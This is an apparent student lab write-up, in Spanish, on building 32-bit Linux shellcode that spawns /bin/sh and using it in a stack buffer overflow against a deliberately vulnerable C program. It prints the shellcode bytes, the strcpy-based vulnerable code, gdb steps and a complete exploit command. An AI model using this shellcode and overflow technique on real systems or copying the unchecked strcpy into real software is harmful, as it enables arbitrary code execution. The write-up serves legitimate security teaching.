# Tarea #5: Shellcode Parte I

## Integrantes:
- Luis Fernando Benavides Villegas
- Alex Steven Naranjo Masís

## Código Ensamblador
Se comienza por crear el archivo `mysh.s`, pegamos el contenido y abrimos una terminal en el directorio de trabajo.  
El código en lenguaje ensamblador lo que hace es construir la cadena `"/bin//sh"` en la pila, preparar el arreglo `argv` y llamar a la interrupción del sistema para ejecutar `execve("/bin//sh", argv, NULL)`. Este pequeño programa será la base para generar el *shellcode* que usaremos posteriormente en el exploit.  
![mysh.s](https://hackmd.io/_uploads/HJZIH9ojgx.png)

## Ensamblando a Código Objeto
Se ejecuta `nasm -f elf32 mysh.s -o mysh.o` para ensamblar el código fuente en un archivo objeto en formato ELF de 32 bits.  
Este paso convierte las instrucciones escritas en ensamblador a instrucciones de máquina empaquetadas en un objeto ELF intermedio (`mysh.o`) que todavía no es ejecutable por sí solo. La opción `-f elf32` asegura que la salida sea compatible con enlazadores de 32 bits.  
![mysh.o](https://hackmd.io/_uploads/rJbIS5jsge.png)

## Enlazando el Código Binario
Se ejecuta `ld -m elf_i386 mysh.o -o mysh` para enlazar el objeto y producir un ejecutable ELF de 32 bits. Este enlazador toma el código objeto (`mysh.o`) y genera el binario final `mysh` que puede ejecutarse en el sistema.  

Luego ejecutamos `echo $$` para imprimir el PID (identificador del proceso) del *shell* actual antes de lanzar el programa, lo que nos permite comparar y verificar que al ejecutar `mysh` se inicia un nuevo proceso de shell con un PID distinto. Esto demuestra que el binario realmente crea un nuevo intérprete `/bin/sh`.  

Ejecutamos el archivo `mysh` y, después, volvemos a ejecutar `echo $$` para confirmar el cambio de PID, por lo que el `mysh` abrió un nuevo shell distinto al original.  
![mysh](https://hackmd.io/_uploads/B1bUr5sigl.png)

## Obteniendo el Código Máquina
Corremos `objdump -Mintel --disassemble mysh.o` para desensamblar el archivo objeto y ver las instrucciones junto con sus bytes en código máquina. Con este comando inspeccionamos la sección `.text` y localizamos el bloque de bytes que corresponde a nuestro `start`.  

Luego, para copiar más fácilmente la sección de bytes que nos interesa y eliminar el ruido que produce la salida del desensamblador, ejecutamos `xxd -p -c 20 mysh.o`. `xxd` imprime el contenido binario en hexadecimal en una sola línea por cada `-c` bytes, lo que facilita extraer el string de bytes contiguos que forman el shellcode.  

![extraer_binario](https://hackmd.io/_uploads/ry-ISqiige.png)

Entonces, podemos extraer el string de código máquina del primer comando utilizando la salida hex de `xxd`. Se selecciona sólo la sección de bytes correspondiente a la rutina `_start` (o la parte relevante del `.text`), ya que la salida completa contiene cabeceras y metadatos del ELF que no forman parte del shellcode ejecutable (la parte seleccionada en la imagen es la que queremos, que es la misma de los bytes del `objdump`).

## Dar Formato al String de Código Máquina
Se escribe un script sencillo en Python que toma el string hexadecimal continuo (`31db31c0...`) y lo convierte en una representación escapada (`\x31\xdb\x31\xc0...`), que es el formato necesario para incrustar el shellcode en cadenas en muchos lenguajes o en línea de comandos para exploits. Este script lee el hex, lo parsea en bytes y produce la cadena con `\x` delante de cada par hex.  

```python
# Aquí se pega el shellcode que se extrajo.
s = """
31c050682f2f7368682f62696e89e3505389e131d231c0b00bcd80
"""

# Convertir el string en bytes y luego formatearlo.
hex = bytes.fromhex(s)
hex_formateado = ''.join('\\x{:02x}'.format(b) for b in hex)

print(hex_formateado)
```

![formatear](https://hackmd.io/_uploads/rkWIHcsjel.png)

Nos retorna la representación lista para usar en el payload, por ejemplo:
```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
```

## Explotar el Programa Vulnerable
Se descarga el programa vulnerable `test.c` y `a.out` y se abre con `gdb` para analizar su comportamiento y ubicar el buffer que podemos sobreescribir. Al depurarlo con `gdb` podemos observar estados, direcciones de memoria y establecer *breakpoints* para inspeccionar el contenido del stack en puntos concretos de la ejecución.  

El código del programa es:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int not_executed() {
  printf("*****Esta funcion no se ejecuta a menos que...*****\n");
  exit(2);
}

int main(int count, char *argument[]) {
  char buffer[100];
  
  if (count < 2) {
    printf("Se debe ingresar texto como entrada. Saliendo...\n");
    exit(1);
  }
  
  strcpy(buffer, argument[1]);
  printf("Yo soy main() y no ejecuto ninguna otra funcion\n");
  
  return 0;
} 
```

![programaVulnerable](https://hackmd.io/_uploads/BJeZUS5jogg.png)

Es posible que el binario venga sin permisos de ejecución, en cuyo caso se corrige con `chmod +x a.out` para poder ejecutarlo dentro de `gdb` o directamente desde la terminal.

Establecemos un breakpoint justo después de que el programa llena el buffer para poder inspeccionarlo fácilmente y así determinar cómo se organiza la memoria. Nuestro objetivo será sobrescribir el `return address` con lo que queramos. 

Ejecutamos `disassemble main` para ver los desplazamientos en main, y ejecutamos `break *main+63` para poner el breakpoint en donde queremos.

![breakpoint](https://hackmd.io/_uploads/BJ-8S5sjxg.png)

Hacemos una prueba ejecutando la función *muerta* `not_executed()` del código C, la cual no se ejecuta en el flujo normal pero existe en el binario. Buscamos su dirección en memoria con `print not_executed` y rellenamos el buffer y el EBP con 104 letras `a`, para luego poner la dirección en la dirección de retorno para que apunte a la función muerta. Es importante recordar que hay que escribir la dirección en formato *Little-Endian*, por lo que si es `0x8049875`, escribimos `\x75\x98\x04\x08`. Podemos ver como se rellenó el buffer ejecutando `x/40x buffer`.

Con esto confirmamos que somos capaces de controlar el flujo de ejecución reescribiendo la dirección de retorno. 

![pruebaNotExecuted](https://hackmd.io/_uploads/Bye-UScsixx.png)

Ahora que sabemos cómo llegar al `return address`, podemos construir el exploit final. Para determinar cuántas `a` se necesitan, calculamos el espacio total hasta la dirección de retorno. Restamos la cantidad necesaria para llenar el buffer (es de un tamaño de 100) y la cantidad ocupada por el EBP (4), y además se resta la longitud del shellcode si vamos a incluirlo antes de la zona de relleno. Por ejemplo, el largo de nuestro shellcode es de 27:
```
104 - 27 = 77
```
Entonces, después de colocar el shellcode, se necesitan 77 caracteres `a` para sobrescribir hasta la dirección de retorno correcta. La dirección de retorno que vamos a escribir será donde comienza el buffer, ya que de esta manera podemos referenciar a donde comienza el shellcode.

![construyendoComando](https://hackmd.io/_uploads/ry-UScssle.png)

Entonces, sabemos que el exploit que vamos a usar es:
```bash
run $(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80" . "a"x77 . "\xa4\xcd\xff\xff"')
```

![exploit](https://hackmd.io/_uploads/rkbLH9ooxg.png)

Y ahora, podemos ejecutar comandos desde la terminal que se abre.
